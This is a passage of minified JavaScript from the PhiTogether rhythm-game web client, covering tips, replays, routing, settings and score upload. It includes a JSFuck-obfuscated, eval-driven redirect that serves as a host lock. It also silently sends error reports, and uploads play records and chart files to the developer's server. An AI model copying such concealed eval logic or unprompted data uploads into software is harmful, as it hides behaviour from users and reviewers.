有没有人能贡献一条比较好的Tip() }",function(){return spec.isPhiTogetherApp?"诶？！你竟然在用 PhiTogether App！":spec.isAppleDevice&&window.spec.isiOSDevice?"让我猜猜，你用的一定是苹果设备!":spec.isAppleDevice&&!window.spec.isiOSDevice?"让我猜猜，你用的一定是苹果设备，是 Mac/Apple Watch/Apple TV 还是 Apple Vision Pro 呢":"让我猜猜，你用的一定是安卓或PC!"},function(){function e(){let s=(new Date-new Date("March 11, 2023 20:20:00"))/1e3,r=Math.ceil(s)/86400;return Math.round(r)}return`当你看到这条 Tip 的时候，PT 已经苟活了 ${e()} 天`},function(e){return`让我猜猜，现在上面的字是 ${e} !`}],tipsHandler={getTip:function(e){let t=tipsArray.concat(partyMgr.filter.activateTips()),n=t[Math.floor(Math.random()*t.length)],s;if(typeof n=="function")try{s=n(e)}catch{s="这里本来应该显示一条动态生成的 Tip，但是出了一些小问题，所以你看到了我（"}else s=n;return"Tip: "+s},addTip:function(e){tipsArray.push(e)}},replayMgr={replaying:!1,playerInfo:{avatar:"https://res.phi.zone/user/default.webp",username:"PTPlayer",id:-1},data:{},speedInfo:null,async loadChartFirst(e){if(this.speedInfo=e.speedInfo,e.songData.song.startsWith("/PTVirtual/")&&!await checkLocalChart(e.songData.id)){shared$1.game.msgHandler.failure(`未在您的本地谱面库中找到 ${e.songData.name} 的谱面 ${e.chartData.id}，无法播放该游玩记录`);return}shared$1.game.loadHandler.l("正在加载谱面","loadChart"),shared$1.game.ptmain.loadChart(e.songData,e.chartData,this.loadChartSecond)},loadChartSecond(e,t){document.getElementById("select-speed").selectedIndex=replayMgr.speedInfo.val;const n={Slowest:-9,Slower:-4,"":0,Faster:3,Fastest:5};shared$1.game.app.speed=2**(n[replayMgr.speedInfo.disp]/12),replayMgr.replaying=!0,shared$1.game.loadHandler.r("loadChart"),shared$1.game.ptmain.$router.push({path:"/playing",query:{auto:1}})},read(e){try{let t=e.slice(0,-32),n=e.slice(-32);t=atob(t),md5$1(t)!==n&&shared$1.game.msgHandler.failure("无法播放：无效的游玩记录文件"),t=JSON.parse(t),this.playerInfo=JSON.parse(decodeURIComponent(t.playerInfo)),this.playerInfo.userName&&(this.playerInfo.username=this.playerInfo.userName),this.data=t.data,this.loadChartFirst(JSON.parse(decodeURIComponent(t.chartInfo)))}catch{shared$1.game.msgHandler.failure("无法播放：无效的游玩记录文件")}}},errsToReport=[],sysError=(e,t,n)=>{const s=getConstructorName(t);let r=String(t),o=String(t);if(t instanceof Error){const u=t.stack||"Stack not available";t.name===s?r=t.message:r=`${t.name}: ${t.message}`;const f=u.indexOf(r)+1;f?o=`${r}
${u.slice(f+r.length)}`:o=`${r}
    ${u.split(`
`).join(`
    `)}`}n&&(r=n);const l=`[${s}] ${r.split(`
`)[0]}`,d=`[${s}] ${o}`;if(!/(orientation|Decoding)/.test(l)){shared$1.game.loadHandler.r(),shared$1.game.spMsgHandler.sendError(l,Utils.escapeHTML(d));try{const u=new FormData;u.append("page",shared$1.game.ptmain.$route.fullPath),u.append("file",e.filename),u.append("msg",t.message),u.append("stack",t.stack),u.append("ver",window.spec.thisVersion),u.append("uid",shared$1.game.ptmain.gameConfig.account.userBasicInfo?shared$1.game.ptmain.gameConfig.account.userBasicInfo.id.toString():"0"),navigator.onLine?fetch("https://api.phitogether.realtvop.eu.org/errReport",{method:"POST",body:u}).catch(f=>f):errsToReport.push(u)}catch(u){console.log(u)}}};self.addEventListener("error",e=>sysError(e,e.error,e.message));self.addEventListener("unhandledrejection",e=>sysError(e,e.reason));window.addEventListener("online",()=>{for(const e of errsToReport)try{e&&fetch("https://api.phitogether.realtvop.eu.org/errReport",{method:"POST",body:e}).then(()=>errsToReport[errsToReport.indexOf(e)]=null).catch(t=>t)}catch{}});window.addEventListener("load",e=>{fetch("https://api.phitogether.realtvop.eu.org/t/o").catch(t=>t)});var searchParams;({}).VITE_FORBID_DEV&&btoa(window.location[(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]])!==atob("Ykc5allXeG9iM04wT2pFME5ETT0=")&&eval(`${atob("d2luZG93LmxvY2F0aW9uLnJlcGxhY2Uo")}"//${atob(atob("Ykc5allXeG9iM04wT2pFME5ETT0="))}"${atob("KQ")}`);const msgHandler$1={nodeText:document.getElementById("msg-out"),lastMessage:"",sendMessage(e,t,n=!0){t==="error"?Notiflix.Notify.failure(e,{ID:"msgHandlerErr",zindex:114515,cssAnimationStyle:"fade",showOnlyTheLastOne:!1,opacity:"0.8",borderRadius:"15px"}):t==="success"?Notiflix.Notify.success(e,{ID:"msgHandlerSuccess",zindex:114515,cssAnimationStyle:"fade",showOnlyTheLastOne:!1,opacity:"0.8",borderRadius:"15px"}):Notiflix.Notify.info(e,{ID:"msgHandlerInfo",zindex:114515,cssAnimationStyle:"fade",clickToClose:!0,showOnlyTheLastOne:!1,opacity:"0.8",borderRadius:"15px"})},confirm(e,t="提示",n="是",s="否"){return new Promise(r=>{Notiflix.Confirm.show(t,e,n,s,()=>{r(!0)},()=>{r(!1)},{zindex:114515,titleColor:"black",okButtonBackground:"#90caf9",messageMaxLength:1e3,plainText:!1})})},info(e,t="提示",n="好",s="info"){return new Promise(r=>{Notiflix.Report[s](t,e,n,()=>{r(!0)},{zindex:114515,titleColor:"black",buttonBackground:"#90caf9",svgSize:"30px"})})},success(e,t="提示",n="好"){return this.info(e,t,n,"success")},failure(e,t="提示",n="好"){return this.info(e,t,n,"failure")},warning(e,t="提示",n="好"){return this.info(e,t,n,"warning")},prompt(e,t="提示",n="确定",s="取消",r=""){return new Promise(function(o){Notiflix.Confirm.prompt(t,e,r,n,s,l=>{o(l)},l=>{o(null)},{zindex:114515,titleColor:"black",okButtonBackground:"#90caf9"})})}};ploading.init({whenShow:()=>{ploading.tip=tipsHandler.getTip(ploading.msg)}});const loadHandler=ploading,mainCtn=document.querySelector("div.main"),requestFullscreen=async e=>{if(!e&&(spec.isPhiTogetherApp||spec.isDesktop||location.hostname==="localhost"||searchParams&&searchParams.get("flag")&&searchParams.get("flag").includes("noRequestingFullscreen"))){shared$1.game.requestedFullscreen=!0;return}if(spec.isiOSDevice){await msgHandler$1.confirm(i18n.global.t("requestFullscreen.requestDownloadiOSApp"))&&(window.location.href="https://testflight.apple.com/join/jMbjenat"),shared$1.game.requestedFullscreen=!0;return}if(!full.enabled){msgHandler$1.sendMessage(i18n.global.t("requestFullscreen.unsupported"),"error"),shared$1.game.requestedFullscreen=!0;return}full.check(mainCtn)||(await msgHandler$1.confirm(i18n.global.t("requestFullscreen.requestFullscreen"),i18n.global.t("info.info"),i18n.global.t("requestFullscreen.clickToFullscreen"),i18n.global.t("info.cancel"))&&full.toggle(mainCtn),shared$1.game.requestedFullscreen=!0)};shared$1.game.requestedFullscreen=!1;shared$1.game.requestFullscreen=requestFullscreen;window.devicePixelRatio>=3&&(document.documentElement.style.fontSize="80%");location.hash.split("?")[1]&&(searchParams=new URLSearchParams(location.hash.slice(location.hash.indexOf("?")+1)));(!location.hash||location.hash!="#/loading")&&(location.hash="#/loading");scrollTo(0,0);document.body.style.overflow="hidden";const router=createRouter({history:createWebHashHistory(),routes});router.beforeEach((e,t)=>{switch($("btn-play").value==="停止"&&$("btn-play").click(),document.getElementById("pageTitle").innerText=i18n.global.t(`pages.${e.path.toLocaleLowerCase()}`).toUpperCase(),["/chartSelect"].includes(e.path)||(document.querySelector("#app").scrollTop=0),e.path){case"/chartUpload":document.getElementById("select2").style.display="block",shared$1.game.clearStat();break;case"/settings":document.getElementById("settings").style.display="block";break;case"/multipanel":shared$1.game.multiInstance.forceOpen=!0,shared$1.game.multiInstance.panelOpen=!0;break;case"/playing":shared$1.game.bubbleAnimator.stop(),document.getElementById("backgroundCanvas").style.display="none",document.querySelector(".background").style.display="none",window.nativeApi&&window.nativeApi.antiAddiction_enterGame&&(document.visibilityState!=="hidden"?window.nativeApi.antiAddiction_enterGame():shared$1.game.afterShow.push(()=>window.nativeApi&&window.nativeApi.antiAddiction_enterGame()));break}switch(t.path){case"/chartUpload":document.getElementById("select2").style.display="none";break;case"/settings":document.getElementById("settings").style.display="none";break;case"/multipanel":shared$1.game.multiInstance.forceOpen=!1,shared$1.game.multiInstance.panelOpen=!1;break;case"/playing":document.getElementById("backgroundCanvas").style.display="block",document.querySelector(".background").style.display="block",shared$1.game.bubbleAnimator.start(),window.nativeApi&&window.nativeApi.antiAddiction_leaveGame&&(document.visibilityState!=="hidden"?window.nativeApi.antiAddiction_leaveGame():shared$1.game.afterShow.push(()=>window.nativeApi&&window.nativeApi.antiAddiction_leaveGame()));break}e.path!="/playing"?(stage$2.style.display="none",replayMgr.replaying=!1):(stage$2.style.display="block",shared$1.game.app.resizeCanvas(),e.query.auto&&btnPlay$1.click());const n=["/playing"];n.includes(t.path)&&!n.includes(e.path)&&($("gameAdjust").style.display="none"),["/chartSelect","/startPage","/replayPage","/loading"].includes(e.path)?(document.body.style.overflow="hidden",document.querySelector("div.main").overflow="hidden"):(document.body.style.overflow="auto",document.querySelector("div.main").overflow="auto"),window.spec.isiOSDevice&&window.spec.isPhiTogetherApp&&document.querySelectorAll(".textInput").forEach(s=>s.disabled=!(s.disabled=!s.disabled))});const ptAppInstance=createApp({template:document.getElementById("app").innerHTML,data(){return{gameConfig:{account:{tokenInfo:null,userBasicInfo:null,defaultConfigID:null,defaultConfig:null,pzBestRecords:{}},ptBestRecords:{},showPoint:!1,showTimer:!1,JITSOpen:!0,defaultRankMethod:"score",denyChartSettings:!1,showTransition:!0,feedback:!1,imageBlur:!0,highLight:!0,showCE2:!1,lineColor:!0,showAcc:!0,showStat:!1,lowRes:!1,noUIBlur:!1,enhanceRankVis:!1,lockOri:!0,aspectRatio:"1.428571",noteScale:"1.15",backgroundDim:"0.6",volume:"2",inputOffset:"0",notifyFinished:!1,isMaxFrame:!1,maxFrame:60,isForcedMaxFrame:!1,enableVP:!1,enableFR:!1,autoDelay:!0,usekwlevelOverbgm:!1,resourcesType:"together-pack-1",customChartServer:"chart.phitogether.fun",prprRespackID:"",enableFilter:!1,filterInput:"",customResourceLink:"",autoplay:!1,competeMode:!1,fullScreenJudge:!1,stopWhenNoLife:!1,useSeparateOffscreenCanvas:!1,reviewWhenResume:!1,allowNonFullscreen:!1,lastVersion:"lastVer"},multiInstance:null,noAccountMode:!0,gameMode:"single",externalHooks:{chartLoaded:null,playerFinished:null},chartOffsetSurface:0,lastLoad:null,playConfig:{practiseMode:!1},thisVersion:packageConfig.version,afterSimphiLoaded:null,prprRespacks:[],canplay:!(window.nativeApi&&window.nativeApi.antiAddiction_enterGame)}},computed:{chartOffsetActual(){return this.chartOffsetSurface*1+this.gameConfig.inputOffset*1},canBack(){return this.gameMode==="single"?!["/loading","/startPage"].includes(this.$route.path):this.$route.path==="/chartUpload"&&shared$1.game.multiInstance.user.isOwner},canSet(){return this.gameMode==="single"?!["/startPage","/settings","/playing","/calibrate","/aboutPage","/chartUpload"].includes(this.$route.path):!1},shouldNotSaveScore(){return this.playConfig.practiseMode||this.playConfig.mode==="preview"||shared$1.game.app.speed!=1||this.gameConfig.fullScreenJudge||replayMgr.replaying},shouldNotUploadPhiZone(){return this.noAccountMode||this.shouldNotSaveScore},userColor(){return getUserColor(this.gameConfig.account.userBasicInfo?this.gameConfig.account.userBasicInfo.role:null)}},watch:{gameConfig:{handler(e,t){ptdb.gameConfig.save(e)},deep:!0},chartOffsetSurface:{handler(e,t){const n=sessionStorage.getItem("loadedChart");if(!n)return;let s;s=localStorage.getItem("PTSavedOffsets"),s?s=JSON.parse(s):s={};const r=JSON.parse(n);s[r.id]=e,localStorage.PTSavedOffsets=JSON.stringify(s)}},"gameConfig.resourcesType":{async handler(e,t){if(!loadHandler.currentId){if(e.startsWith("together-pack")||e==="pt-custom"){try{t==="prpr-custom"&&await(await caches.open("PTv0-User")).delete("/PTVirtual/user/respack.zip")}catch{}e.startsWith("together-pack")&&await msgHandler$1.confirm(this.$t("respack.requestReload"))&&location.reload()}else if(e==="prpr-custom")return}}},playConfig:{handler(e,t){document.getElementById("select-speed").value=e.speed||"",document.getElementById("select-flip").value=e.mirror?"1":"0",shared$1.game.simphi.mirrorView(document.getElementById("select-flip").value),shared$1.game.simphi.speed=2**({Slowest:-9,Slower:-4,"":0,Faster:3,Fastest:5}[document.getElementById("select-speed").value]/12),e.videoRecorder?shared$1.game.simphiPlugins.videoRecorder.enable():shared$1.game.simphiPlugins.videoRecorder.disable()}}},methods:{uploadCustomRespack(){Object.assign(document.createElement("input"),{type:"file",accept:"",onchange(){const t=this.files[0],n=new FileReader;n.readAsArrayBuffer(t),n.onload=async s=>{try{const r=s.target.result,o=await shared$1.game.loadSkinFromBuffer(r,!1,ptdb.skin.save);ptmain.prprRespacks=await ptdb.skin.getAll(),ptmain.gameConfig.prprRespackID=o,msgHandler$1.sendMessage(i18n.global.t("respack.customResApplied"))}catch{ptmain.gameConfig.resourcesType=oldVal}}}}).click()},openMultiPanel(){shared$1.game.multiInstance.panelOpen=!0,shared$1.game.multiInstance.panelChoice="messages"},doCalibrate(){this.$router.push("/calibrate")},ptAppPause(e){btnPause$1.value=="暂停"&&btnPause$1.click()},spClickLB(){if(shared$1.game.isPlayFinished()&&shared$1.game.ptmain.playConfig.mode!=="preview")shared$1.game.exportRecord&&shared$1.game.exportRecord();else if(this.gameMode==="single"){if(btnPause$1.value=="暂停")return;switch(selectflip$1.value){case"0":selectflip$1.value="3",shared$1.game.simphi.mirrorView(3);break;case"1":selectflip$1.value="2",shared$1.game.simphi.mirrorView(2);break;case"2":selectflip$1.value="1",shared$1.game.simphi.mirrorView(1);break;case"3":selectflip$1.value="0",shared$1.game.simphi.mirrorView(0);break}}else shared$1.game.multiInstance.JITSOpen=!shared$1.game.multiInstance.JITSOpen},spClickLT(){shared$1.game.simphi.emitter.eq("play")&&btnPause$1.click()},async modJudgment(){try{if(this.noAccountMode){msgHandler$1.failure(this.$t("phizone.modJudgment.offline"));return}const e=this.gameConfig.account.defaultConfig;await msgHandler$1.confirm(this.$t("phizone.modJudgment.current",[e.perfectJudgment,e.goodJudgment]),this.$t("info.info"),this.$t("info.mod"),this.$t("info.cancel"))&&setTimeout(async()=>{const t=parseInt(await msgHandler$1.prompt(this.$t("phizone.modJudgment.enterPJ")));if(isNaN(t)||!(t>=25&&t<=100)){msgHandler$1.sendMessage(this.$t("phizone.modJudgment.inputDosentMatchRequirement"),"error");return}setTimeout(async()=>{const n=parseInt(await msgHandler$1.prompt(this.$t("phizone.modJudgment.enterGJ")));if(isNaN(n)||!(n>t&&n>=60&&n<=180)){msgHandler$1.sendMessage(this.$t("phizone.modJudgment.inputDosentMatchRequirement"),"error");return}try{loadHandler.l(this.$t("phizone.modJudgment.modifying"),"modJudgment"),await PhiZoneAPI.patchSpecConfiguration(this.gameConfig.account.tokenInfo.access_token,this.gameConfig.account.defaultConfigID,{perfectJudgment:t,goodJudgment:n,musicSpeed:1}),msgHandler$1.sendMessage(this.$t("phizone.modJudgment.success"))}catch{msgHandler$1.sendMessage(this.$t("phizone.modJudgment.error"),"error")}finally{loadHandler.r("modJudgment")}},500)},500)}catch{msgHandler$1.sendMessage(this.$t("phizone.modJudgment.error"),"error"),loadHandler.r("modJudgment")}},async genPlayToken(){try{const e=JSON.parse(sessionStorage.getItem("loadedChart")),t=JSON.parse(sessionStorage.getItem("pzPlayInfo"));if(e.isFromPhiZone&&(!t||t.for!==e.id)){loadHandler.l(this.$t("phizone.scoreUpload.getToken"),"playChart"),shared$1.game.judgeManager.setJudgeTime();const s=await(await PhiZoneAPI.playChart(this.gameConfig.account.tokenInfo.access_token,e.id,this.gameConfig.account.defaultConfigID)).json();sessionStorage.setItem("pzPlayInfo",JSON.stringify(s.data)),shared$1.game.judgeManager.setJudgeTime(this.gameConfig.account.defaultConfig.perfectJudgment/1e3,this.gameConfig.account.defaultConfig.goodJudgment/1e3,this.gameConfig.account.defaultConfig.perfectJudgment/2e3)}loadHandler.r("playChart")}catch{loadHandler.r("playChart"),shared$1.game.msgHandler.failure(this.$t("phizone.scoreUpload.getTokenErr"));return}},async spClickRT(){this.gameMode!=="multi"&&(btnPause$1.value==="暂停"&&btnPause$1.click(),shared$1.game.app.pauseNextTick&&(clearInterval(shared$1.game.app.pauseNextTick),shared$1.game.app.pauseTime=0,shared$1.game.app.pauseNextTick=null),recordMgr.reset(),shared$1.game.restartClearRecord(),Promise.resolve().then(shared$1.game.qwqStop).then(shared$1.game.qwqStop))},async playChart(e){this.gameMode!=="multi"&&!this.shouldNotUploadPhiZone&&await this.genPlayToken(),e&&(this.playConfig=JSON.parse(JSON.stringify(e))),this.$router.push({path:"/playing",query:{auto:1}}),shared$1.game.restartClearRecord&&shared$1.game.restartClearRecord()},async playFinished(){if(replayMgr.replaying||shared$1.game.multiInstance.room.compete_mode&&shared$1.game.multiInstance.owner){scoreLoadingAndResultData.display=!1;return}shared$1.game.finishToRecord&&shared$1.game.finishToRecord();const e=JSON.parse(sessionStorage.getItem("loadedChart")),t=shared$1.game.ptmain.gameMode==="multi";!this.shouldNotUploadPhiZone&&e.isFromPhiZone?(scoreLoadingAndResultData.display=!0,scoreLoadingAndResultData.text=this.$t("phizone.scoreUpload.uploading"),scoreLoadingAndResultData.startTime=null,scoreLoadingAndResultData.loaded=0):scoreLoadingAndResultData.display=!1;const n=()=>new Promise(async o=>{if(this.shouldNotUploadPhiZone||!e.isFromPhiZone){o(!0);return}const l=shared$1.game.stat,d={chart:e.id,max_combo:l.maxcombo,perfect:l.noteRank[4]+l.noteRank[5]+l.noteRank[1],good_early:l.noteRank[7],good_late:l.noteRank[3],bad:l.noteRank[6],miss:l.noteRank[2],stdDeviation:recordMgr.stdDeviation};PhiZoneAPI.recordEncrypted(d,this.gameConfig.account).then(u=>{this.gameConfig.account.userBasicInfo.rks=u.player.rks,this.gameConfig.account.userBasicInfo.experience=u.player.experience,scoreLoadingAndResultData.text=`EXP+${u.experienceDelta} RKS+${(u.player.rks-u.rksBefore).toFixed(3)}`,scoreLoadingAndResultData.data={name:this.gameConfig.account.userBasicInfo.userName,rks:u.player.rks.toFixed(3),exp:this.gameConfig.account.userBasicInfo.experience+u.experienceDelta},scoreLoadingAndResultData.loaded=1,sessionStorage.removeItem("pzPlayInfo"),PhiZoneAPI.getUserBestRecords(this.gameConfig.account.tokenInfo.access_token,u.player.id).then(async f=>{try{this.gameConfig.account.pzBestRecords=f,o(!0)}catch{rej(!1)}}),o(!0)}).catch(async u=>{if(loadHandler.r("uploadScore"),!await msgHandler$1.confirm(this.$t("phizone.scoreUpload.failed"),this.$t("info.error"))){o(!0),scoreLoadingAndResultData.display=!1;return}await n(),o(!0)})}),s=()=>new Promise(async o=>{if(this.shouldNotSaveScore||e.isFromPhiZone){o(!0);return}try{const l=shared$1.game.stat,d={chart:e.id,score:l.scoreNum.toFixed(0),acc:l.accNum,isFC:l.lineStatus==3};this.gameConfig.ptBestRecords||(this.gameConfig.ptBestRecords={}),this.gameConfig.ptBestRecords[d.chart]=this.gameConfig.ptBestRecords[d.chart]||[d.score,d.acc,d.isFC],this.gameConfig.ptBestRecords[d.chart][0]=Math.max(this.gameConfig.ptBestRecords[d.chart][0],d.score),this.gameConfig.ptBestRecords[d.chart][1]=Math.max(this.gameConfig.ptBestRecords[d.chart][1],d.acc),this.gameConfig.ptBestRecords[d.chart][2]=this.gameConfig.ptBestRecords[d.chart][2]||d.isFC,o(!0)}catch{o(!1)}}),r=async()=>{const o=shared$1.game.stat,l={chart:e.id,score:o.scoreNum.toFixed(0),acc:o.accNum,isFC:o.lineStatus==3};recordMgr.chartInfo.playScore=[l.score,l.acc,l.isFC];const[d,u]=recordMgr.export(),f=new FormData;f.append("text",d),f.append("filename",encodeURI(`AutoUpload_${u.chartInfo.songData.name}${u.chartInfo.chartData.level}${u.chartInfo.chartData.difficulty}-${u.playerInfo.userName}-${new Date().format("YmdHis")}.ptr`)),fetch("https://api.phitogether.realtvop.eu.org/record/upload",{method:"POST",body:f}).then(m=>m.json()).then(m=>{if(!m.ce){const g=new FormData,y=JSON.parse(sessionStorage.getItem("chartDetailsData"));y.chart=JSON.parse(sessionStorage.getItem("loadedChart")),g.append("m",JSON.stringify(y)),self.hook.oriBuffers.forEach((v,x)=>g.append("f",new Blob([v]),x)),fetch("https://api.phitogether.realtvop.eu.org/record/ctupload",{method:"POST",body:g})}})};await n(),await s(),await r(),t&&shared$1.game.multiInstance.uploadScore()},async playerLoaded(){if(self.hook.pause=this.ptAppPause,await ptdb.gameConfig.get().then(n=>{let s=!1;for(const r of Object.keys(ptmain.gameConfig))r in n?ptmain.gameConfig[r]=n[r]:s=!0;s&&ptdb.gameConfig.save(ptmain.gameConfig);for(const r of Object.keys(ptmain.gameConfig)){const o=ptmain.gameConfig[r];r=="volume"?(shared$1.game.app.musicVolume=Math.min(1,1/o),shared$1.game.app.soundVolume=Math.min(1,o)):r=="aspectRatio"?shared$1.game.stage.resize(Number(o)):r=="noteScale"?shared$1.game.app.setNoteScale(Number(o)):r=="backgroundDim"?shared$1.game.app.brightness=Number(o):r=="highLight"?shared$1.game.app.multiHint=o:r=="lowRes"?shared$1.game.app.setLowResFactor(o?window.devicePixelRatio<2?.85:.5:1):r=="enableVP"?shared$1.game.app.enableVP=o:r=="enableFR"?shared$1.game.app.enableFR=o:r=="maxFrame"?ptmain.gameConfig.isMaxFrame?shared$1.game.frameAnimater.setFrameRate(o,ptmain.gameConfig.isForcedMaxFrame):shared$1.game.frameAnimater.setFrameRate(0,ptmain.gameConfig.isForcedMaxFrame):r=="enableFilter"?$("enableFilter").dispatchEvent(new Event("change")):r=="filterInput"&&$("filterInput").dispatchEvent(new Event("change"))}}).catch(n=>msgHandler$1.sendMessage(this.$t("config.dbUpgraded"),"error")),document.getElementById("noUIBlur").addEventListener("change",async()=>{await msgHandler$1.confirm(this.$t("askForReload.msg"),this.$t("askForReload.title"),this.$t("askForReload.yes"),this.$t("askForReload.no"))&&location.reload()}),this.gameConfig.noUIBlur&&(document.getElementById("ptTitle").classList.remove("blur"),loadHandler.useBlur=!1,loadHandler.refreshBlurState()),!this.gameConfig.notifyFinished){let n=s=>{msgHandler$1.sendMessage(this.$t("askPermission.notification.err"),"error",!1),this.gameConfig.notifyFinished=!0};"Notification"in self&&await msgHandler$1.confirm(this.$t("askPermission.notification.msg"))?Notification.requestPermission().then(()=>{this.gameConfig.notifyFinished=!0}).catch(n):n()}try{const s=await(await fetch("/latestVersion.json?nocacahe=nocache")).json();if(window.spec.thisVersion!=s.ver&&await msgHandler$1.confirm(this.$t("update.newVersionNotify",[window.spec.thisVersion,s.ver]))){this.update();return}}catch{msgHandler$1.sendMessage(this.$t("update.autoUpdateCheckFailed"),"error")}document.addEventListener("fullscreenchange",()=>{full.check(mainCtn)?this.$route.path==="/playing"&&(shared$1.game.app.isFull||shared$1.game.doFullScreen()):requestFullscreen()}),document.addEventListener("visibilitychange",()=>{if(document.visibilityState==="visible"){if(shared$1.game.afterShow){for(const n of shared$1.game.afterShow)n();shared$1.game.afterShow=[]}requestFullscreen()}});const e=async()=>{!full.check(mainCtn)&&window.innerHeight>window.innerWidth&&await msgHandler$1.confirm(this.$t("requestLandscape.requestLandscape"),this.$t("info.info"),this.$t("requestLandscape.toggleFullScrOption"),this.$t("info.cancel"))&&full.toggle(mainCtn)};this.prprRespacks=await ptdb.skin.getAll(),window.addEventListener("resize",e),setTimeout(e,500);const t=this.gameConfig.account;t.tokenInfo&&t.userBasicInfo&&this.pzRefreshLogin(),shared$1.game.loaded(),stage$2.style.display="none",searchParams&&searchParams.get("play")&&this.loadFromRedirect()},async simphiLoaded(){this.afterSimphiLoaded?(loadHandler.r("simphiloading"),this.afterSimphiLoaded()):this.afterSimphiLoaded=!0},async loadFromRedirect(){loadHandler.l(this.$t("loadChart.loading"),"loadChartfr");try{let e;if(searchParams.get("type")==="pz"){e=await PhiZoneAPI.getChartAndItsSongAsv1(searchParams.get("chart")),shared$1.game.judgeManager.setJudgeTime();const t={token:searchParams.get("token"),for:searchParams.get("chart"),timestamp:searchParams.get("timestamp")};sessionStorage.setItem("pzPlayInfo",JSON.stringify(t));const n=await PhiZoneAPI.getSpecConfiguration("",searchParams.get("configuration"));shared$1.game.judgeManager.setJudgeTime(n.perfectJudgment/1e3,n.goodJudgment/1e3,n.perfectJudgment/2e3)}else if(searchParams.get("type")==="custom")e={id:searchParams.get("name"),charter:searchParams.get("charter"),chart:searchParams.get("chart"),level:searchParams.get("level"),difficulty:searchParams.get("difficulty"),ranked:!1,isFromURL:!0,song:{id:searchParams.get("name"),composer:searchParams.get("composer"),name:searchParams.get("name"),song:searchParams.get("song"),edition:"From URL",illustration:searchParams.get("illustration"),illustrator:searchParams.get("illustrator"),bpm:"0",duration:"00:00:00",preview_start:"00:00:00",isFromURL:!0}},searchParams.get("mode")==="preview"&&(this.playConfig={mode:"preview",practiseMode:!0}),searchParams.get("flag")&&searchParams.get("flag").includes("adjustOffset")&&(this.playConfig.adjustOffset=!0);else if(searchParams.get("type")==="selfUploadChart"){searchParams.get("mode")==="preview"&&(this.playConfig={mode:"preview",practiseMode:!0}),searchParams.get("flag")&&searchParams.get("flag").includes("adjustOffset")&&(this.playConfig.adjustOffset=!0);let t=[];searchParams.get("illustration")&&t.push(searchParams.get("illustration")+"?nocacahe=nocache"),searchParams.get("song")&&t.push(searchParams.get("song")+"?nocacahe=nocache"),shared$1.game.clearStat();const n=t.length;return uploader.reset(n),Promise.all(t.map(s=>fetch(s).then(async r=>r))).then(async s=>{let r=0;for(const o of s)r++,loadHandler.l(this.$t("loadChart.info",{loaded:r,resNum:n}),"loadSong"),uploader.fireLoad({name:o.url},await o.arrayBuffer())}).catch(s=>{msgHandler$1.sendMessage(this.$t("loadChart.failed"),"error"),loadHandler.r("loadSong")}),this.$router.push({path:"/chartUpload",query:{name:searchParams.get("name"),composer:searchParams.get("composer"),charter:this.cleanStr(searchParams.get("charter")),illustrator:searchParams.get("illustrator"),level:searchParams.get("level"),difficulty:searchParams.get("difficulty"),then:"playing"}})}loadHandler.l(this.$t("loadChart.loading"),"loadChart"),this.loadChart(e.song,e,function(){shared$1.game.ptmain.$router.push({path:"/playing",query:{auto:1}}),loadHandler.r("loadChartfr"),loadHandler.r("playChart"),loadHandler.r("loadChart")})}catch(e){msgHandler$1.sendMessage(this.$t("loadChart.failedFromPZRedirect"),"error"),console.error(e),loadHandler.r("loadChartfr")}},async pzRefreshLogin(){const e=this.gameConfig.account;if(e.userBasicInfo.username)return this.gameConfig.account={tokenInfo:null,userBasicInfo:null,defaultConfigID:null,defaultConfig:null,pzBestRecords:{},ptBestRecords:{}};msgHandler$1.sendMessage(this.$t("phizone.login.autologgingin"),"info"),PhiZoneAPI.refreshLogin(e.tokenInfo.refresh_token,"refresh_token",e.userBasicInfo.userName).then(async t=>{e.tokenInfo=t,await this.loadUserRelatedInfo(t.access_token)}).catch(async t=>{msgHandler$1.sendMessage(this.$t("phizone.login.autologinFailed"),"error"),recordMgr.reset(this.gameConfig.account.userBasicInfo)})},update(){caches.delete("PTv0-Main").then(()=>{const e=`/#${searchParams?`/updateAndPlayChart?${searchParams.toString()}`:"update"}`;fetch(e,{headers:{Pragma:"no-cache",Expires:"-1","Cache-Control":"no-cache"}}).then(()=>{window.location.href=e,window.location.reload(!0)})})},loadUserRelatedInfo(e){return msgHandler$1.sendMessage(this.$t("phizone.login.updatingUserInfo"),"info"),new Promise((t,n)=>{const 